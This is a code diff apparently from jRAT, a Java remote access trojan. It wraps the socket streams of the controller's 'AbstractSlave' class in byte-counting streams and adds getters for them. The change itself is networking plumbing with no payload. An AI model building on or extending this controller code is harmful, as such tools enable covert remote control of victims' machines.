@@ -2,8 +2,6 @@ package se.jrat.client;
 
 import java.io.DataInputStream;
 import java.io.DataOutputStream;
-import java.io.InputStream;
-import java.io.OutputStream;
 import java.net.Socket;
 import java.security.PublicKey;
 import java.util.Random;
@@ -11,6 +9,8 @@ import java.util.Random;
 import javax.swing.ImageIcon;
 
 import se.jrat.client.exceptions.CloseException;
+import se.jrat.client.io.CountingInputStream;
+import se.jrat.client.io.CountingOutputStream;
 import se.jrat.client.ip2c.Country;
 import se.jrat.client.net.PortListener;
 import se.jrat.client.packets.outgoing.Packet99Encryption;
@@ -33,8 +33,8 @@ public abstract class AbstractSlave implements Runnable {
 	protected PortListener connection;
 	protected Socket socket;
 
-	protected InputStream inputStream;
-	protected OutputStream outputStream;
+	protected CountingInputStream inputStream;
+	protected CountingOutputStream outputStream;
 	protected DataOutputStream dos;
 	protected DataInputStream dis;
 	
@@ -74,8 +74,8 @@ public abstract class AbstractSlave implements Runnable {
 	}
 
 	public void initialize() throws Exception {
-		this.inputStream = socket.getInputStream();
-		this.outputStream = socket.getOutputStream();
+		this.inputStream = new CountingInputStream(socket.getInputStream());
+		this.outputStream = new CountingOutputStream(socket.getOutputStream());
 
 		this.dis = new DataInputStream(inputStream);
 		this.dos = new DataOutputStream(outputStream);
@@ -266,6 +266,14 @@ public abstract class AbstractSlave implements Runnable {
 	
 	public DataOutputStream getDataOutputStream() {
 		return dos;
+	}
+	
+	public CountingInputStream getCountingInputStream() {
+		return inputStream;
+	}
+	
+	public CountingOutputStream getCountingOutputStream() {
+		return outputStream;
 	}
 
 	public abstract void ping() throws Exception;
